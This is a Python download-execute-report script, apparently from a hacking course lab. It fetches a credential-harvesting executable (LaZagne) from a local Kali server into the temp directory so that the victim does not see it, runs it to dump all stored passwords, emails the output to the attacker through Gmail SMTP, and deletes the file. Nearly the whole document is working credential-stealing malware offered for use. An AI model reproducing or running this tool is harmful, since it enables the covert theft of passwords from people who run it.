#!/usr/bin/env python

# This script downloads an evil .exe file from the local server running on kali machine. And then, run
# run that program which is a credential haverster. After gathering information, it reports the hacker
# through email

import os
import requests
import smtplib
import subprocess
import tempfile
import optparse


def getInput():
    parser = optparse.OptionParser(usage="Usage: download_execute_report [-e] [email] [-p] [password] [-u] [link] ["
                                         "-c] [command]\nUsage "
                                         "Example:\tdownload_execute_report -e email@gmail.com -p Password -u "
                                         "http://10.0.2.5/evil-files/lazagne.exe -c \"lazagne.exe all\"")
    parser.add_option("-e", "--email", dest="email", help="Specify email")
    parser.add_option("-p", "--password", dest="pwd", help="Specify Password")
    parser.add_option("-u", "--url", dest="url", help="Specify file url to be downloaded")
    parser.add_option("-c", "--cmd", dest="cmd", help="Specify command to be executed in quotation")
    options = parser.parse_args()[0]
    return options


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.send(email, email, message)
    server.close()


def download_file(url):
    get_response = requests.get(url)
    fileName = url.split("/")[-1]
    with open(fileName, "wb") as out_file:
        out_file.write(get_response.content)


def main():
    options = getInput()
    if not options.email:
        print("[-] specify email")
    elif not options.pwd:
        print("[-] specify password")
    elif not options.url:
        print("[-] specify file URL")
    elif not options.cmd:
        print("[-] specify command to be run ")
    else:
        temp_directory = tempfile.gettempdir()
        os.chdir(temp_directory)

        # downloading file from the local kali server to the temp_directory so that victim could not see the file
        download_file(options.url)

        # executing command to get all passwords
        result = subprocess.check_output(options.cmd, shell=True)
        print(result)

        # reporting the result on email
        send_mail(options.email, options.pwd, result)

        # deleting the file
        fileName = options.url.split("/")[-1]
        os.remove(fileName)


main()
